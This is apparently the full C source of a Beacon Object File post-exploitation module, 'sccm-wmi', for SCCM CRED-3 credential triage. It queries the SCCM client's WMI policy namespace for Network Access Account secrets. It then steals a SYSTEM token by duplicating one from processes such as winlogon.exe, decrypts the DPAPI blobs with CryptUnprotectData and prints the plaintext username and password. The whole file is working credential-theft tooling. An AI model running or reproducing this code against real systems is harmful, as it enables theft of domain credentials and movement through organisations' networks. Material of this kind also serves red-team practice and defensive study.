/*
 * sccm-wmi BOF — SCCM CRED-3 triage (live WMI)
 *
 * Queries live SCCM policy via WMI (ROOT\ccm\policy\Machine\ActualConfig) and
 * decrypts the CCM_NetworkAccessAccount PolicySecret blobs locally with
 * CryptUnprotectData as SYSTEM. Requires high integrity (admin).
 *
 * Self-contained port of sccm-bofs (src/bofs/sccm.c + the WMI/impersonation/
 * decrypt helpers it uses). The legacy manual DPAPI masterkey path is omitted:
 * the WMI path always passes a NULL masterkey cache, so only the direct
 * CryptUnprotectData (CRED_PROTECTED blob) path is exercised.
 */
#include "bofdefs.h"

#ifdef BOF
#include "beacon.h"
#else
#include <stdio.h>
#include <stdarg.h>
#define CALLBACK_OUTPUT 0x0
#define CALLBACK_ERROR  0x0d
static void BeaconPrintf(int type, const char* fmt, ...) {
    FILE* f = (type == CALLBACK_ERROR) ? stderr : stdout;
    va_list ap;
    va_start(ap, fmt);
    vfprintf(f, fmt, ap);
    va_end(ap);
}
#endif

#ifndef COBJMACROS
#define COBJMACROS
#endif
#include <objbase.h>
#include <oleauto.h>
#include <wbemcli.h>
#include <tlhelp32.h>

#ifdef BOF
DECLSPEC_IMPORT HRESULT WINAPI OLE32$CoInitializeEx(LPVOID, DWORD);
DECLSPEC_IMPORT HRESULT WINAPI OLE32$CoInitializeSecurity(PSECURITY_DESCRIPTOR, LONG, SOLE_AUTHENTICATION_SERVICE*, void*, DWORD, DWORD, void*, DWORD, void*);
DECLSPEC_IMPORT HRESULT WINAPI OLE32$CoCreateInstance(REFCLSID, LPUNKNOWN, DWORD, REFIID, LPVOID*);
DECLSPEC_IMPORT HRESULT WINAPI OLE32$CoSetProxyBlanket(IUnknown*, DWORD, DWORD, OLECHAR*, DWORD, DWORD, RPC_AUTH_IDENTITY_HANDLE, DWORD);
DECLSPEC_IMPORT void    WINAPI OLE32$CoUninitialize(void);
DECLSPEC_IMPORT BSTR    WINAPI OLEAUT32$SysAllocString(const OLECHAR*);
DECLSPEC_IMPORT void    WINAPI OLEAUT32$SysFreeString(BSTR);
DECLSPEC_IMPORT HRESULT WINAPI OLEAUT32$VariantClear(VARIANTARG*);
DECLSPEC_IMPORT HANDLE  WINAPI KERNEL32$CreateToolhelp32Snapshot(DWORD, DWORD);
DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$Process32FirstW(HANDLE, LPPROCESSENTRY32W);
DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$Process32NextW(HANDLE, LPPROCESSENTRY32W);
#endif

/* ========================================================================
 * Helpers
 * ======================================================================== */

static BYTE* hex_to_bytes(const char* hex, int* out_len) {
    if (!hex || !out_len) return NULL;
    int slen = strlen(hex);
    if (slen % 2 != 0) return NULL;

    int blen = slen / 2;
    BYTE* bytes = (BYTE*)intAlloc(blen);
    if (!bytes) return NULL;

    for (int i = 0; i < blen; i++) {
        unsigned int val = 0;
        char tmp[3] = { hex[i * 2], hex[i * 2 + 1], 0 };
        for (int j = 0; j < 2; j++) {
            val <<= 4;
            char c = tmp[j];
            if (c >= '0' && c <= '9') val |= (c - '0');
            else if (c >= 'a' && c <= 'f') val |= (c - 'a' + 10);
            else if (c >= 'A' && c <= 'F') val |= (c - 'A' + 10);
            else { intFree(bytes); return NULL; }
        }
        bytes[i] = (BYTE)val;
    }
    *out_len = blen;
    return bytes;
}

static char* bytes_to_hex(const BYTE* data, int len) {
    if (!data || len <= 0) return NULL;
    char* hex = (char*)intAlloc(len * 2 + 1);
    if (!hex) return NULL;
    for (int i = 0; i < len; i++) {
        sprintf(hex + i * 2, "%02X", data[i]);
    }
    hex[len * 2] = 0;
    return hex;
}

static char* wide_to_utf8(const wchar_t* wstr) {
    if (!wstr) return NULL;
#ifdef BOF
    int len = KERNEL32$WideCharToMultiByte(CP_UTF8, 0, wstr, -1, NULL, 0, NULL, NULL);
    if (len <= 0) return NULL;
    char* str = (char*)intAlloc(len);
    if (!str) return NULL;
    KERNEL32$WideCharToMultiByte(CP_UTF8, 0, wstr, -1, str, len, NULL, NULL);
#else
    int len = WideCharToMultiByte(CP_UTF8, 0, wstr, -1, NULL, 0, NULL, NULL);
    if (len <= 0) return NULL;
    char* str = (char*)intAlloc(len);
    if (!str) return NULL;
    WideCharToMultiByte(CP_UTF8, 0, wstr, -1, str, len, NULL, NULL);
#endif
    return str;
}

static BOOL is_high_integrity(void) {
    HANDLE hToken = NULL;
    BOOL result = FALSE;

#ifdef BOF
    if (!ADVAPI32$OpenProcessToken(KERNEL32$GetCurrentProcess(), TOKEN_QUERY, &hToken))
        return FALSE;

    DWORD dwSize = 0;
    ADVAPI32$GetTokenInformation(hToken, TokenIntegrityLevel, NULL, 0, &dwSize);
    if (dwSize == 0) { KERNEL32$CloseHandle(hToken); return FALSE; }

    TOKEN_MANDATORY_LABEL* tml = (TOKEN_MANDATORY_LABEL*)intAlloc(dwSize);
    if (!tml) { KERNEL32$CloseHandle(hToken); return FALSE; }

    if (ADVAPI32$GetTokenInformation(hToken, TokenIntegrityLevel, tml, dwSize, &dwSize)) {
        DWORD* pCount = (DWORD*)ADVAPI32$GetSidSubAuthorityCount(tml->Label.Sid);
        DWORD integrity = *ADVAPI32$GetSidSubAuthority(tml->Label.Sid, *pCount - 1);
        result = (integrity >= SECURITY_MANDATORY_HIGH_RID);
    }

    intFree(tml);
    KERNEL32$CloseHandle(hToken);
#else
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken))
        return FALSE;

    DWORD dwSize = 0;
    GetTokenInformation(hToken, TokenIntegrityLevel, NULL, 0, &dwSize);
    if (dwSize == 0) { CloseHandle(hToken); return FALSE; }

    TOKEN_MANDATORY_LABEL* tml = (TOKEN_MANDATORY_LABEL*)intAlloc(dwSize);
    if (!tml) { CloseHandle(hToken); return FALSE; }

    if (GetTokenInformation(hToken, TokenIntegrityLevel, tml, dwSize, &dwSize)) {
        PUCHAR pCount = GetSidSubAuthorityCount(tml->Label.Sid);
        DWORD integrity = *GetSidSubAuthority(tml->Label.Sid, (DWORD)*pCount - 1);
        result = (integrity >= SECURITY_MANDATORY_HIGH_RID);
    }

    intFree(tml);
    CloseHandle(hToken);
#endif

    return result;
}

static char* extract_ascii(const BYTE* data, int start, int end) {
    if (!data || start < 0 || end < start) return NULL;
    int len = end - start;
    if (len <= 0 || len > 16384) return NULL;
    char* out = (char*)intAlloc(len + 1);
    if (!out) return NULL;
    memcpy(out, data + start, len);
    out[len] = 0;
    return out;
}

static BOOL is_hex_char(char c) {
    return ((c >= '0' && c <= '9') ||
            (c >= 'a' && c <= 'f') ||
            (c >= 'A' && c <= 'F'));
}

static char* extract_longest_hex_blob(const char* text) {
    int best_start = -1;
    int best_len = 0;
    int run_start = -1;
    int run_len = 0;

    if (!text) return NULL;

    for (int i = 0;; i++) {
        char c = text[i];
        if (is_hex_char(c)) {
            if (run_len == 0) run_start = i;
            run_len++;
        } else {
            int candidate_len = run_len - (run_len % 2);
            if (candidate_len >= 16 && candidate_len > best_len) {
                best_start = run_start;
                best_len = candidate_len;
            }
            run_start = -1;
            run_len = 0;
            if (c == '\0') break;
        }
    }

    if (best_start < 0 || best_len <= 0) return NULL;
    return extract_ascii((const BYTE*)text, best_start, best_start + best_len);
}

static char* extract_wmi_policy_secret_hex(const wchar_t* value) {
    char* utf8 = NULL;
    char* hex = NULL;

    if (!value) return NULL;

    utf8 = wide_to_utf8(value);
    if (!utf8) return NULL;

    hex = extract_longest_hex_blob(utf8);
    intFree(utf8);
    return hex;
}

static BOOL looks_like_utf16le(const BYTE* data, int data_len) {
    if (!data || data_len < 4 || (data_len % 2) != 0) return FALSE;

    int pairs = data_len / 2;
    int high_zero = 0;
    int printable = 0;

    for (int i = 0; i < data_len; i += 2) {
        BYTE lo = data[i];
        BYTE hi = data[i + 1];
        if (hi == 0) high_zero++;
        if ((lo >= 0x20 && lo <= 0x7E) || lo == 0x09 || lo == 0x0A || lo == 0x0D)
            printable++;
    }

    return (high_zero >= (pairs * 6 / 10)) && (printable > 0);
}

static char* secret_bytes_to_utf8(const BYTE* data, int data_len) {
    int utf16_len;
    char* utf8;
    char* ascii;
    int trimmed;

    if (!data || data_len <= 0) return NULL;

    utf16_len = data_len;
    while (utf16_len >= 2 &&
           data[utf16_len - 2] == 0 &&
           data[utf16_len - 1] == 0) {
        utf16_len -= 2;
    }

    if (utf16_len > 0 &&
        (utf16_len % 2) == 0 &&
        looks_like_utf16le(data, utf16_len)) {
        wchar_t* wtmp = (wchar_t*)intAlloc(utf16_len + sizeof(wchar_t));
        if (!wtmp) return NULL;
        memcpy(wtmp, data, utf16_len);
        wtmp[utf16_len / 2] = L'\0';
        utf8 = wide_to_utf8(wtmp);
        intFree(wtmp);
        return utf8;
    }

    trimmed = data_len;
    while (trimmed > 0 && data[trimmed - 1] == 0) trimmed--;
    if (trimmed <= 0 || trimmed > 16384) return NULL;

    ascii = (char*)intAlloc(trimmed + 1);
    if (!ascii) return NULL;
    memcpy(ascii, data, trimmed);
    ascii[trimmed] = '\0';
    return ascii;
}

static void print_secret_value(const char* label, const BYTE* data, int data_len) {
    if (!label || !data || data_len <= 0) return;

    int utf16_len = data_len;
    while (utf16_len >= 2 &&
           data[utf16_len - 2] == 0 &&
           data[utf16_len - 1] == 0) {
        utf16_len -= 2;
    }

    if (utf16_len > 0 &&
        (utf16_len % 2) == 0 &&
        looks_like_utf16le(data, utf16_len)) {
        wchar_t* wtmp = (wchar_t*)intAlloc(utf16_len + sizeof(wchar_t));
        if (wtmp) {
            memcpy(wtmp, data, utf16_len);
            wtmp[utf16_len / 2] = L'\0';
            char* utf8 = wide_to_utf8(wtmp);
            if (utf8) {
                BeaconPrintf(CALLBACK_OUTPUT, "    %s : %s\n", label, utf8);
                intFree(utf8);
                intFree(wtmp);
                return;
            }
            intFree(wtmp);
        }
    }

    int trimmed = data_len;
    while (trimmed > 0 && data[trimmed - 1] == 0) trimmed--;
    if (trimmed <= 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "    %s : <empty>\n", label);
        return;
    }

    char* hex = bytes_to_hex(data, trimmed);
    if (hex) {
        BeaconPrintf(CALLBACK_OUTPUT, "    %s (hex) : %s\n", label, hex);
        intFree(hex);
    }
}

static BOOL is_sccm_machine_account_value(const BYTE* data, int data_len) {
    static const BYTE marker[] = { 0x00, 0x00, 0x0E, 0x0E, 0x0E };

    if (!data || data_len < (int)sizeof(marker)) return FALSE;
    return (memcmp(data, marker, sizeof(marker)) == 0);
}

/* ========================================================================
 * Decrypt (direct CryptUnprotectData / CRED_PROTECTED blob path only)
 * ======================================================================== */

static BOOL decrypt_sccm_secret_hex(const char* secret_hex,
                                    BYTE** out_data, int* out_len) {
    if (!secret_hex || !out_data || !out_len) return FALSE;
    *out_data = NULL;
    *out_len = 0;

    int hex_len = (int)strlen(secret_hex);
    if (hex_len < 16 || (hex_len % 2) != 0 || hex_len > (1024 * 1024)) return FALSE;
    for (int i = 0; i < hex_len; i++) {
        char c = secret_hex[i];
        BOOL valid = ((c >= '0' && c <= '9') ||
                      (c >= 'a' && c <= 'f') ||
                      (c >= 'A' && c <= 'F'));
        if (!valid) return FALSE;
    }

    int raw_len = 0;
    BYTE* raw = hex_to_bytes(secret_hex, &raw_len);
    if (!raw || raw_len <= 0) return FALSE;

    for (int candidate = 0; candidate < 2; candidate++) {
        int off = (candidate == 0) ? 4 : 0;
        int len = raw_len - off;
        if (len < 44) continue;
        const BYTE* p = raw + off;
        if (*(DWORD*)p != 1) continue;
        if (!(p[4] == 0xD0 && p[5] == 0x8C && p[6] == 0x9D && p[7] == 0xDF)) continue;

        DATA_BLOB in;
        DATA_BLOB out;
        memset(&in, 0, sizeof(in));
        memset(&out, 0, sizeof(out));
        in.pbData = (BYTE*)p;
        in.cbData = (DWORD)len;

#ifdef BOF
        if (CRYPT32$CryptUnprotectData(&in, NULL, NULL, NULL, NULL, 0, &out) &&
            out.pbData && out.cbData > 0) {
            BYTE* copied = (BYTE*)intAlloc(out.cbData);
            if (copied) {
                memcpy(copied, out.pbData, out.cbData);
                *out_data = copied;
                *out_len = (int)out.cbData;
                KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, out.pbData);
                intFree(raw);
                return TRUE;
            }
            KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, out.pbData);
        }
#else
        if (CryptUnprotectData(&in, NULL, NULL, NULL, NULL, 0, &out) &&
            out.pbData && out.cbData > 0) {
            BYTE* copied = (BYTE*)intAlloc(out.cbData);
            if (copied) {
                memcpy(copied, out.pbData, out.cbData);
                *out_data = copied;
                *out_len = (int)out.cbData;
                HeapFree(GetProcessHeap(), 0, out.pbData);
                intFree(raw);
                return TRUE;
            }
            HeapFree(GetProcessHeap(), 0, out.pbData);
        }
#endif
    }

    intFree(raw);
    return FALSE;
}

static int triage_sccm_secret(const char* label,
                              const char* protected_hex,
                              BOOL* machine_account) {
    BYTE* decrypted = NULL;
    int decrypted_len = 0;
    BOOL ok = FALSE;

    if (!label) return 0;

    if (!protected_hex) {
        BeaconPrintf(CALLBACK_OUTPUT, "    [!] %s blob was not found\n", label);
        return 0;
    }

    ok = decrypt_sccm_secret_hex(protected_hex, &decrypted, &decrypted_len);
    if (ok) {
        char* text = secret_bytes_to_utf8(decrypted, decrypted_len);
        print_secret_value(label, decrypted, decrypted_len);
        if (text) {
            if (strstr(text, "<PolicyXML") && strstr(text, "Compression=\"zlib\"")) {
                BeaconPrintf(CALLBACK_OUTPUT,
                             "    [*] Decrypted SCCM policy XML uses zlib compression; BOF decompression is not implemented yet\n");
            }
            intFree(text);
        }
        if (machine_account && is_sccm_machine_account_value(decrypted, decrypted_len)) {
            *machine_account = TRUE;
        }
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "    [!] Failed to decrypt %s blob\n", label);
    }

    if (decrypted) intFree(decrypted);
    return ok ? 1 : 0;
}

/* ========================================================================
 * SYSTEM impersonation
 * ======================================================================== */

static BOOL is_local_system_sid(PSID sid) {
    static const BYTE nt_authority[6] = SECURITY_NT_AUTHORITY;
    SID* parsed_sid = (SID*)sid;

    if (!parsed_sid) return FALSE;
    if (parsed_sid->Revision != SID_REVISION) return FALSE;
    if (parsed_sid->SubAuthorityCount != 1) return FALSE;
    if (memcmp(parsed_sid->IdentifierAuthority.Value, nt_authority, sizeof(nt_authority)) != 0)
        return FALSE;

    return (parsed_sid->SubAuthority[0] == SECURITY_LOCAL_SYSTEM_RID);
}

static BOOL token_is_system(HANDLE token) {
    DWORD size = 0;
    BOOL result = FALSE;

    if (!token) return FALSE;

#ifdef BOF
    ADVAPI32$GetTokenInformation(token, TokenUser, NULL, 0, &size);
#else
    GetTokenInformation(token, TokenUser, NULL, 0, &size);
#endif
    if (size == 0) return FALSE;

    TOKEN_USER* user = (TOKEN_USER*)intAlloc(size);
    if (!user) return FALSE;

#ifdef BOF
    if (ADVAPI32$GetTokenInformation(token, TokenUser, user, size, &size)) {
#else
    if (GetTokenInformation(token, TokenUser, user, size, &size)) {
#endif
        result = is_local_system_sid(user->User.Sid);
    }

    intFree(user);
    return result;
}

static BOOL sccm_is_system(void) {
    HANDLE hToken = NULL;
    BOOL result = FALSE;

#ifdef BOF
    if (!ADVAPI32$OpenProcessToken(KERNEL32$GetCurrentProcess(), TOKEN_QUERY, &hToken))
        return FALSE;
    result = token_is_system(hToken);
    KERNEL32$CloseHandle(hToken);
#else
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken))
        return FALSE;
    result = token_is_system(hToken);
    CloseHandle(hToken);
#endif

    return result;
}

static BOOL impersonate_system_process(const wchar_t* process_name) {
    HANDLE hSnapshot = INVALID_HANDLE_VALUE;
    PROCESSENTRY32W pe32;
    BOOL result = FALSE;

    if (!process_name) return FALSE;

    memset(&pe32, 0, sizeof(pe32));
    pe32.dwSize = sizeof(pe32);

#ifdef BOF
    hSnapshot = KERNEL32$CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return FALSE;

    if (!KERNEL32$Process32FirstW(hSnapshot, &pe32)) {
        KERNEL32$CloseHandle(hSnapshot);
        return FALSE;
    }

    do {
        HANDLE hProcess = NULL;
        HANDLE hToken = NULL;
        HANDLE hDupToken = NULL;

        if (_wcsicmp(pe32.szExeFile, process_name) != 0) continue;

        hProcess = KERNEL32$OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pe32.th32ProcessID);
        if (!hProcess) hProcess = KERNEL32$OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pe32.th32ProcessID);
        if (!hProcess) continue;

        if (!ADVAPI32$OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY, &hToken))
            goto cleanup_process_bof;
        if (!token_is_system(hToken)) goto cleanup_process_bof;
        if (!ADVAPI32$DuplicateToken(hToken, SecurityImpersonation, &hDupToken))
            goto cleanup_process_bof;
        if (ADVAPI32$ImpersonateLoggedOnUser(hDupToken)) {
            result = TRUE;
        }

cleanup_process_bof:
        if (hDupToken) KERNEL32$CloseHandle(hDupToken);
        if (hToken) KERNEL32$CloseHandle(hToken);
        if (hProcess) KERNEL32$CloseHandle(hProcess);
        if (result) break;
    } while (KERNEL32$Process32NextW(hSnapshot, &pe32));

    KERNEL32$CloseHandle(hSnapshot);
#else
    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return FALSE;

    if (!Process32FirstW(hSnapshot, &pe32)) {
        CloseHandle(hSnapshot);
        return FALSE;
    }

    do {
        HANDLE hProcess = NULL;
        HANDLE hToken = NULL;
        HANDLE hDupToken = NULL;

        if (_wcsicmp(pe32.szExeFile, process_name) != 0) continue;

        hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pe32.th32ProcessID);
        if (!hProcess) hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pe32.th32ProcessID);
        if (!hProcess) continue;

        if (!OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY, &hToken))
            goto cleanup_process;
        if (!token_is_system(hToken)) goto cleanup_process;
        if (!DuplicateToken(hToken, SecurityImpersonation, &hDupToken))
            goto cleanup_process;
        if (ImpersonateLoggedOnUser(hDupToken)) {
            result = TRUE;
        }

cleanup_process:
        if (hDupToken) CloseHandle(hDupToken);
        if (hToken) CloseHandle(hToken);
        if (hProcess) CloseHandle(hProcess);
        if (result) break;
    } while (Process32NextW(hSnapshot, &pe32));

    CloseHandle(hSnapshot);
#endif

    return result;
}

static BOOL sccm_get_system_if_needed(BOOL* impersonated) {
    static const wchar_t* candidates[] = {
        L"winlogon.exe",
        L"services.exe",
        L"svchost.exe",
        L"spoolsv.exe"
    };

    if (impersonated) *impersonated = FALSE;

    if (sccm_is_system()) return TRUE;

    for (int i = 0; i < (int)(sizeof(candidates) / sizeof(candidates[0])); i++) {
        if (impersonate_system_process(candidates[i])) {
            if (impersonated) *impersonated = TRUE;
            return TRUE;
        }
    }

    BeaconPrintf(CALLBACK_ERROR,
                 "[!] Failed to impersonate SYSTEM; local SCCM DPAPI decrypt requires a SYSTEM token\n");
    return FALSE;
}

static void sccm_revert_if_needed(BOOL impersonated) {
    if (!impersonated) return;

#ifdef BOF
    ADVAPI32$RevertToSelf();
#else
    RevertToSelf();
#endif
}

/* ========================================================================
 * WMI CRED-3 triage
 * ======================================================================== */

static const CLSID SCCM_WBEM_LOCATOR_CLSID = {
    0x4590f811, 0x1d3a, 0x11d0, { 0x89, 0x1f, 0x00, 0xaa, 0x00, 0x4b, 0x2e, 0x24 }
};

static const IID SCCM_IID_WBEM_LOCATOR = {
    0xdc12a687, 0x737f, 0x11cf, { 0x88, 0x4d, 0x00, 0xaa, 0x00, 0x4b, 0x2e, 0x24 }
};

static BOOL triage_sccm_wmi(void) {
    static const wchar_t namespace_path[] = L"ROOT\\ccm\\policy\\Machine\\ActualConfig";
    static const wchar_t query_text[] =
        L"SELECT NetworkAccessUsername, NetworkAccessPassword FROM CCM_NetworkAccessAccount";

    HRESULT hr;
    BOOL com_initialized = FALSE;
    BOOL result = FALSE;
    IWbemLocator* locator = NULL;
    IWbemServices* services = NULL;
    IEnumWbemClassObject* enumerator = NULL;
    BSTR ns = NULL;
    BSTR lang = NULL;
    BSTR query = NULL;
    int accounts = 0;
    int decrypted = 0;

    BeaconPrintf(CALLBACK_OUTPUT, "[*] SCCM source: WMI %S\n", namespace_path);

#ifdef BOF
    hr = OLE32$CoInitializeEx(NULL, COINIT_MULTITHREADED);
#else
    hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
#endif
    if (SUCCEEDED(hr)) {
        com_initialized = TRUE;
    } else if (hr != RPC_E_CHANGED_MODE) {
        BeaconPrintf(CALLBACK_ERROR, "[!] CoInitializeEx failed: 0x%08lx\n", hr);
        goto cleanup;
    }

#ifdef BOF
    hr = OLE32$CoInitializeSecurity(NULL, -1, NULL, NULL,
                                    RPC_C_AUTHN_LEVEL_DEFAULT,
                                    RPC_C_IMP_LEVEL_IMPERSONATE,
                                    NULL, EOAC_NONE, NULL);
#else
    hr = CoInitializeSecurity(NULL, -1, NULL, NULL,
                              RPC_C_AUTHN_LEVEL_DEFAULT,
                              RPC_C_IMP_LEVEL_IMPERSONATE,
                              NULL, EOAC_NONE, NULL);
#endif
    if (FAILED(hr) && hr != RPC_E_TOO_LATE) {
        BeaconPrintf(CALLBACK_ERROR, "[!] CoInitializeSecurity failed: 0x%08lx\n", hr);
        goto cleanup;
    }

#ifdef BOF
    hr = OLE32$CoCreateInstance(&SCCM_WBEM_LOCATOR_CLSID, NULL, CLSCTX_INPROC_SERVER,
                                &SCCM_IID_WBEM_LOCATOR, (LPVOID*)&locator);
#else
    hr = CoCreateInstance(&SCCM_WBEM_LOCATOR_CLSID, NULL, CLSCTX_INPROC_SERVER,
                          &SCCM_IID_WBEM_LOCATOR, (LPVOID*)&locator);
#endif
    if (FAILED(hr) || !locator) {
        BeaconPrintf(CALLBACK_ERROR, "[!] CoCreateInstance(IWbemLocator) failed: 0x%08lx\n", hr);
        goto cleanup;
    }

#ifdef BOF
    ns = OLEAUT32$SysAllocString(namespace_path);
    lang = OLEAUT32$SysAllocString(L"WQL");
    query = OLEAUT32$SysAllocString(query_text);
#else
    ns = SysAllocString(namespace_path);
    lang = SysAllocString(L"WQL");
    query = SysAllocString(query_text);
#endif
    if (!ns || !lang || !query) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Failed to allocate WMI query strings\n");
        goto cleanup;
    }

    hr = IWbemLocator_ConnectServer(locator, ns, NULL, NULL, NULL, 0, NULL, NULL, &services);
    if (FAILED(hr) || !services) {
        if (hr == (HRESULT)0x8004100e) {
            BeaconPrintf(CALLBACK_ERROR,
                         "[!] SCCM WMI namespace %S does not exist on this host (0x%08lx)\n",
                         namespace_path, hr);
            BeaconPrintf(CALLBACK_OUTPUT,
                         "[*] CRED-3 requires a live SCCM client policy namespace\n");
            BeaconPrintf(CALLBACK_OUTPUT,
                         "[*] This usually means the host is not an active SCCM client, or the live policy namespace is unavailable\n");
            BeaconPrintf(CALLBACK_OUTPUT,
                         "[*] Try the disk/CRED-4 path against OBJECTS.DATA instead\n");
        } else {
            BeaconPrintf(CALLBACK_ERROR, "[!] IWbemLocator::ConnectServer failed: 0x%08lx\n", hr);
        }
        goto cleanup;
    }

#ifdef BOF
    hr = OLE32$CoSetProxyBlanket((IUnknown*)services,
                                 RPC_C_AUTHN_WINNT,
                                 RPC_C_AUTHZ_NONE,
                                 NULL,
                                 RPC_C_AUTHN_LEVEL_CALL,
                                 RPC_C_IMP_LEVEL_IMPERSONATE,
                                 NULL,
                                 EOAC_NONE);
#else
    hr = CoSetProxyBlanket((IUnknown*)services,
                           RPC_C_AUTHN_WINNT,
                           RPC_C_AUTHZ_NONE,
                           NULL,
                           RPC_C_AUTHN_LEVEL_CALL,
                           RPC_C_IMP_LEVEL_IMPERSONATE,
                           NULL,
                           EOAC_NONE);
#endif
    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_ERROR, "[!] CoSetProxyBlanket failed: 0x%08lx\n", hr);
        goto cleanup;
    }

    hr = IWbemServices_ExecQuery(services, lang, query,
                                 WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY,
                                 NULL, &enumerator);
    if (FAILED(hr) || !enumerator) {
        BeaconPrintf(CALLBACK_ERROR, "[!] IWbemServices::ExecQuery failed: 0x%08lx\n", hr);
        goto cleanup;
    }

    for (;;) {
        IWbemClassObject* object = NULL;
        ULONG returned = 0;
        VARIANT username_value;
        VARIANT password_value;
        char* user_hex = NULL;
        char* pass_hex = NULL;
        BOOL machine_account = FALSE;

        memset(&username_value, 0, sizeof(username_value));
        memset(&password_value, 0, sizeof(password_value));

        hr = IEnumWbemClassObject_Next(enumerator, WBEM_INFINITE, 1, &object, &returned);
        if (FAILED(hr)) {
            BeaconPrintf(CALLBACK_ERROR, "[!] IEnumWbemClassObject::Next failed: 0x%08lx\n", hr);
            break;
        }
        if (returned == 0 || !object) break;

        accounts++;
        BeaconPrintf(CALLBACK_OUTPUT, "\n[*] Triaging SCCM Network Access Account #%d\n", accounts);

        if (SUCCEEDED(IWbemClassObject_Get(object, L"NetworkAccessUsername", 0, &username_value, NULL, NULL)) &&
            V_VT(&username_value) == VT_BSTR && V_BSTR(&username_value)) {
            user_hex = extract_wmi_policy_secret_hex(V_BSTR(&username_value));
        }

        if (SUCCEEDED(IWbemClassObject_Get(object, L"NetworkAccessPassword", 0, &password_value, NULL, NULL)) &&
            V_VT(&password_value) == VT_BSTR && V_BSTR(&password_value)) {
            pass_hex = extract_wmi_policy_secret_hex(V_BSTR(&password_value));
        }

        decrypted += triage_sccm_secret("Plaintext NAA Username", user_hex, &machine_account);
        decrypted += triage_sccm_secret("Plaintext NAA Password", pass_hex, &machine_account);

        if (machine_account) {
            BeaconPrintf(CALLBACK_OUTPUT,
                         "    [!] SCCM is configured to use the client's machine account instead of an NAA\n");
        }

        if (user_hex) intFree(user_hex);
        if (pass_hex) intFree(pass_hex);
#ifdef BOF
        OLEAUT32$VariantClear(&username_value);
        OLEAUT32$VariantClear(&password_value);
#else
        VariantClear(&username_value);
        VariantClear(&password_value);
#endif
        IWbemClassObject_Release(object);
    }

    if (accounts == 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "[*] Found 0 SCCM Network Access Account entries in WMI\n");
    } else {
        BeaconPrintf(CALLBACK_OUTPUT,
                     "\n[*] SCCM WMI triage complete: %d account entries, %d decrypted secrets\n",
                     accounts, decrypted);
    }

    result = (decrypted > 0);

cleanup:
    if (enumerator) IEnumWbemClassObject_Release(enumerator);
    if (services) IWbemServices_Release(services);
    if (locator) IWbemLocator_Release(locator);
#ifdef BOF
    if (query) OLEAUT32$SysFreeString(query);
    if (lang) OLEAUT32$SysFreeString(lang);
    if (ns) OLEAUT32$SysFreeString(ns);
    if (com_initialized) OLE32$CoUninitialize();
#else
    if (query) SysFreeString(query);
    if (lang) SysFreeString(lang);
    if (ns) SysFreeString(ns);
    if (com_initialized) CoUninitialize();
#endif

    return result;
}

/* ========================================================================
 * Entry point
 * ======================================================================== */

#ifdef BOF
void go(char* args, int args_len) {
    if (args_len > 0) {
        datap parser;
        BeaconDataParse(&parser, args, args_len);
        char* target_str = BeaconDataExtract(&parser, NULL);
        if (target_str && strlen(target_str) > 0) {
            BeaconPrintf(CALLBACK_ERROR,
                "[!] sccm-wmi no longer accepts /target:PATH; use sccm-disk for CRED-4 OBJECTS.DATA triage\n");
            return;
        }
    }

    if (!is_high_integrity()) {
        BeaconPrintf(CALLBACK_ERROR,
            "[!] SCCM triage requires high integrity (admin) context\n");
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "\n=== DPAPI SCCM CRED-3 (BOF) ===\n");

    BOOL impersonated = FALSE;

    if (!sccm_get_system_if_needed(&impersonated)) {
        return;
    }

    triage_sccm_wmi();

    sccm_revert_if_needed(impersonated);
}
#else
int main(void) {
    if (!is_high_integrity()) {
        BeaconPrintf(CALLBACK_ERROR,
            "[!] SCCM triage requires high integrity (admin) context\n");
        return 1;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "\n=== DPAPI SCCM CRED-3 (BOF) ===\n");

    BOOL impersonated = FALSE;
    if (!sccm_get_system_if_needed(&impersonated)) {
        return 1;
    }

    triage_sccm_wmi();

    sccm_revert_if_needed(impersonated);
    return 0;
}
#endif
